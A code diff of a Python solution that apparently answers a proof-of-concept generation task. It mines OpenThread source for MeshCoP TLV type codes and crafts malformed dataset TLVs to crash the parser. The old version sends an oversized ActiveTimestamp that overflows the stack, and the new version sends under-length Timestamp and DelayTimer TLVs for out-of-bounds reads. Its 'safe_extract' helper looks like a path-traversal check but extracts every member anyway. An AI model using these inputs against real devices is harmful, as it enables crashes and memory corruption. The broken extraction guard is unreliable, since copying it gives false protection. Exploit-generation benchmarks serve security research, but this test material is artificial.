@@ -1,118 +1,231 @@
 import os
-import tarfile
 import re
-from typing import Optional, Dict
+import tarfile
+import tempfile
+
+
+def _remove_comments(text: str) -> str:
+    text = re.sub(r'/\*.*?\*/', '', text, flags=re.S)
+    text = re.sub(r'//.*', '', text)
+    return text
+
+
+def _parse_enums_for_types(text: str) -> dict:
+    """
+    Parse C/C++ enum blocks and try to map enumerator names to their integer values.
+    Returns a dict of enumerator name -> int value.
+    """
+    text_nc = _remove_comments(text)
+    enums = {}
+    # Match enum, enum class, etc. with body inside braces
+    for m in re.finditer(r'enum(?:\s+(?:class|struct))?\s*[^{]*\{(.*?)\}', text_nc, flags=re.S):
+        body = m.group(1)
+        # Split by commas at top-level (very rough, but should work for simple enums)
+        parts = body.split(',')
+        current_value = 0
+        have_value = False
+        for part in parts:
+            p = part.strip()
+            if not p:
+                continue
+            # Remove possible trailing attributes or comments (already removed)
+            # Extract name and optional assigned value
+            # Handle cases like: kFoo = 0x12, or kBar = SOME_MACRO (skip non-numeric)
+            m2 = re.match(r'^([A-Za-z_]\w*)\s*(?:=\s*([^,\}]+))?$', p)
+            if not m2:
+                continue
+            name, val = m2.group(1), m2.group(2)
+            if val is not None:
+                val_s = val.strip()
+                # Try to parse integer literal (hex/dec)
+                try:
+                    # Remove possible casts or suffixes by taking leading numeric/hex token
+                    mnum = re.match(r'^(0x[0-9A-Fa-f]+|\d+)', val_s)
+                    if mnum:
+                        current_value = int(mnum.group(1), 0)
+                        have_value = True
+                    else:
+                        # Not a numeric literal, skip assigning numeric value update
+                        # Keep current_value as is; we cannot resolve macros here.
+                        # To avoid wrong sequence, we won't update current_value in this case.
+                        pass
+                except Exception:
+                    pass
+            enums[name] = current_value if have_value else enums.get(name, None)
+            # Increment for next enumerator only if we have a numeric base
+            if have_value:
+                current_value += 1
+    return enums
+
+
+def _search_direct_assignments(text: str, names):
+    """
+    Look for direct assignments like kActiveTimestamp = 0x51
+    Returns dict name -> int if found.
+    """
+    text_nc = _remove_comments(text)
+    out = {}
+    for name in names:
+        # Try kActiveTimestamp = value
+        m = re.search(r'\b' + re.escape(name) + r'\s*=\s*(0x[0-9A-Fa-f]+|\d+)', text_nc)
+        if m:
+            try:
+                out[name] = int(m.group(1), 0)
+            except Exception:
+                pass
+    return out
+
+
+def _find_type_codes(root_dir: str) -> dict:
+    """
+    Find MeshCoP TLV type codes for ActiveTimestamp, PendingTimestamp, DelayTimer.
+    Returns mapping short names to integers:
+      {"ActiveTimestamp": int, "PendingTimestamp": int, "DelayTimer": int}
+    """
+    target_enum_names = {
+        "ActiveTimestamp": ["kActiveTimestamp", "ActiveTimestamp", "ActiveTimestampTlv"],
+        "PendingTimestamp": ["kPendingTimestamp", "PendingTimestamp", "PendingTimestampTlv"],
+        "DelayTimer": ["kDelayTimer", "DelayTimer", "DelayTimerTlv"],
+    }
+
+    # Accumulate potential mappings from enums and direct assignments
+    found = {}
+    # To prioritize more specific matches (meshcop/dataset related files)
+    candidate_files = []
+
+    for dirpath, _, filenames in os.walk(root_dir):
+        for fn in filenames:
+            if not fn.lower().endswith(('.h', '.hpp', '.hh', '.hxx', '.c', '.cc', '.cpp', '.cxx', '.ipp', '.inl')):
+                continue
+            full = os.path.join(dirpath, fn)
+            # Prioritize meshcop/dataset related files
+            score = 0
+            lfn = full.lower()
+            if 'meshcop' in lfn:
+                score += 3
+            if 'dataset' in lfn:
+                score += 2
+            if 'tlv' in lfn:
+                score += 2
+            if 'openthread' in lfn or 'ot-' in lfn:
+                score += 1
+            candidate_files.append((score, full))
+
+    # Sort files by score descending to inspect likely relevant ones first
+    candidate_files.sort(key=lambda x: -x[0])
+
+    # We'll limit how many files to parse deeply to keep performance reasonable
+    max_files_to_parse = 800  # sufficiently large for typical repos
+    parsed = 0
+
+    enum_name_map = {}
+    for _, path in candidate_files:
+        if parsed >= max_files_to_parse:
+            break
+        try:
+            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+                text = f.read()
+        except Exception:
+            continue
+        parsed += 1
+
+        # Direct assignments first
+        for key, names in target_enum_names.items():
+            direct = _search_direct_assignments(text, names)
+            for nm, val in direct.items():
+                if key not in found and val is not None:
+                    # Assign
+                    found[key] = val
+
+        # Parse enums to build a name->value map
+        enum_map = _parse_enums_for_types(text)
+        # If we have values for our names, assign them
+        for key, names in target_enum_names.items():
+            if key in found:
+                continue
+            for nm in names:
+                if nm in enum_map and enum_map[nm] is not None:
+                    found[key] = enum_map[nm]
+                    break
+
+        if all(k in found for k in target_enum_names):
+            break
+
+    return found
+
+
+def _encode_tlv(t: int, length: int, value_bytes: bytes) -> bytes:
+    # Assume MeshCoP TLV format with 1-byte type, 1-byte length, followed by value
+    # We ensure length matches value_bytes length
+    if length != len(value_bytes):
+        value_bytes = value_bytes[:length].ljust(length, b'\x00')
+    return bytes((t & 0xFF, length & 0xFF)) + value_bytes
 
 
 class Solution:
-    def _extract(self, src_path: str, dst: str) -> None:
-        try:
-            with tarfile.open(src_path, "r:*") as tf:
-                tf.extractall(dst)
-        except Exception:
-            pass
-
-    def _find_files(self, root: str, patterns) -> Dict[str, str]:
-        matches = {}
-        for base, _, files in os.walk(root):
-            for f in files:
-                path = os.path.join(base, f)
-                try:
-                    with open(path, "r", errors="ignore") as fh:
-                        content = fh.read()
-                        for p in patterns:
-                            if re.search(p, content):
-                                matches[path] = content
-                                break
-                except Exception:
-                    continue
-        return matches
-
-    def _parse_type_values(self, texts: Dict[str, str]) -> Dict[str, int]:
-        # Attempt to recover TLV type numbers from source
-        # Defaults based on Thread MeshCoP TLVs
-        type_map = {
-            "ActiveTimestamp": 0x00,
-            "PendingTimestamp": 0x01,
-            "DelayTimer": 0x34,  # common value in MeshCoP
-        }
-
-        # Regex patterns to capture enum assignments
-        pats = {
-            "ActiveTimestamp": re.compile(r"k(?:Type)?ActiveTimestamp\s*=\s*(0x[0-9a-fA-F]+|\d+)"),
-            "PendingTimestamp": re.compile(r"k(?:Type)?PendingTimestamp\s*=\s*(0x[0-9a-fA-F]+|\d+)"),
-            "DelayTimer": re.compile(r"k(?:Type)?DelayTimer\s*=\s*(0x[0-9a-fA-F]+|\d+)"),
-        }
-
-        for content in texts.values():
-            for key, pat in pats.items():
-                m = pat.search(content)
-                if m:
-                    try:
-                        v = int(m.group(1), 0)
-                        type_map[key] = v & 0xFF
-                    except Exception:
-                        pass
-        return type_map
-
-    def _guess_uses_dataset_from_tlvs(self, texts: Dict[str, str]) -> bool:
-        # Try to see if any fuzz target consumes raw dataset TLVs
-        for content in texts.values():
-            if ("LLVMFuzzerTestOneInput" in content and
-                ("otDatasetFromTlvs" in content or
-                 "otOperationalDatasetFromTlvs" in content or
-                 "OperationalDataset::SetFrom" in content or
-                 "Dataset::SetFrom" in content or
-                 "Dataset::IsTlvValid" in content)):
-                return True
-        # Also search any source mentioning Dataset::IsTlvValid (indicates raw TLV may be accepted)
-        for content in texts.values():
-            if "Dataset::IsTlvValid" in content:
-                return True
-        return False
-
-    def _build_tlv(self, tlv_type: int, length: int, value: bytes) -> bytes:
-        # MeshCoP TLVs generally use 1-byte Type and 1-byte Length
-        # We clamp to 0..255 for safety
-        length = max(0, min(255, length))
-        if len(value) < length:
-            value = value + b"\x00" * (length - len(value))
-        elif len(value) > length:
-            value = value[:length]
-        return bytes([tlv_type & 0xFF, length]) + value
-
     def solve(self, src_path: str) -> bytes:
-        # Strategy:
-        # - Try to detect TLV type numbers from source; fall back to common defaults.
-        # - Build a MeshCoP Dataset containing an Active Timestamp TLV with an oversized length (255).
-        #   Vulnerable versions do not validate min required length correctly, which leads to copying
-        #   'length' bytes into a fixed-size timestamp field (8 bytes), causing a stack overflow.
-        # - Fixed versions reject such TLVs during validation.
-        tmp_dir = os.path.join("/tmp", "src_extract_385180600")
+        tmpdir = tempfile.mkdtemp(prefix="poc_gen_")
+        # Extract tarball
         try:
-            os.makedirs(tmp_dir, exist_ok=True)
+            with tarfile.open(src_path, 'r:*') as tf:
+                def is_within_directory(directory, target):
+                    abs_directory = os.path.abspath(directory)
+                    abs_target = os.path.abspath(target)
+                    prefix = os.path.commonprefix([abs_directory, abs_target])
+                    return prefix == abs_directory
+
+                def safe_extract(tar, path=".", members=None, *, numeric_owner=False):
+                    for member in tar.getmembers():
+                        member_path = os.path.join(path, member.name)
+                        if not is_within_directory(path, member_path):
+                            continue
+                    tar.extractall(path, members, numeric_owner=numeric_owner)
+                safe_extract(tf, tmpdir)
         except Exception:
-            pass
+            # If extraction fails, fallback to generating generic TLVs with common guesses
+            tmpdir = None
 
-        self._extract(src_path, tmp_dir)
+        mapping = {}
+        if tmpdir is not None:
+            mapping = _find_type_codes(tmpdir)
 
-        patterns = [
-            r"LLVMFuzzerTestOneInput",
-            r"Dataset::IsTlvValid",
-            r"otDatasetFromTlvs",
-            r"otOperationalDatasetFromTlvs",
-            r"k(?:Type)?ActiveTimestamp",
-            r"k(?:Type)?PendingTimestamp",
-            r"k(?:Type)?DelayTimer",
-        ]
-        files = self._find_files(tmp_dir, patterns)
-        type_map = self._parse_type_values(files)
-        _ = self._guess_uses_dataset_from_tlvs(files)  # not strictly required; kept for completeness
+        # Fallback guesses if not found in codebase (best-effort common MeshCoP assignments)
+        # These guesses are based on common Thread MeshCoP TLV type allocations in practice.
+        # If parsing succeeded, these will be overridden.
+        guesses = {
+            "ActiveTimestamp": 0x51,
+            "PendingTimestamp": 0x52,
+            "DelayTimer": 0x54,
+        }
+        for k, v in guesses.items():
+            mapping.setdefault(k, v)
 
-        # Build a PoC: One TLV with ActiveTimestamp and an oversized length of 255 bytes.
-        tlv_type = type_map.get("ActiveTimestamp", 0x00)
-        value = b"A" * 255
-        poc = self._build_tlv(tlv_type, 255, value)
+        # Build a TLV sequence intentionally under-length for the vulnerable TLVs.
+        # We include all three with too-short lengths. Place ActiveTimestamp last to amplify OOB access.
+        tlvs = []
 
-        # Keep the PoC small; adding padding could risk parsing of extra garbage TLV.
-        return poc
+        # PendingTimestamp: requires >= 8 bytes; provide 1 byte
+        if "PendingTimestamp" in mapping:
+            tlvs.append(_encode_tlv(mapping["PendingTimestamp"], 1, b'\x00'))
+
+        # DelayTimer: requires >= 4 bytes; provide 1 byte
+        if "DelayTimer" in mapping:
+            tlvs.append(_encode_tlv(mapping["DelayTimer"], 1, b'\xff'))
+
+        # Add some padding/benign TLV(s) with unknown types to mimic realistic dataset and reduce early rejects
+        # Use types unlikely to collide with known ones and small lengths.
+        # Even if ignored, they help structure the input.
+        tlvs.append(_encode_tlv(0x01, 3, b'ABC'))
+        tlvs.append(_encode_tlv(0x02, 5, b'HELLO'))
+
+        # ActiveTimestamp: requires >= 8 bytes; provide 1 byte; put it at the end to maximize OOB read
+        if "ActiveTimestamp" in mapping:
+            tlvs.append(_encode_tlv(mapping["ActiveTimestamp"], 1, b'\x00'))
+
+        data = b''.join(tlvs)
+
+        # Ensure data is non-empty and not excessively small; optionally pad with no-op bytes (unknown TLVs)
+        if len(data) < 9:
+            data += _encode_tlv(0x7E, 4, b'DATA')
+
+        return data
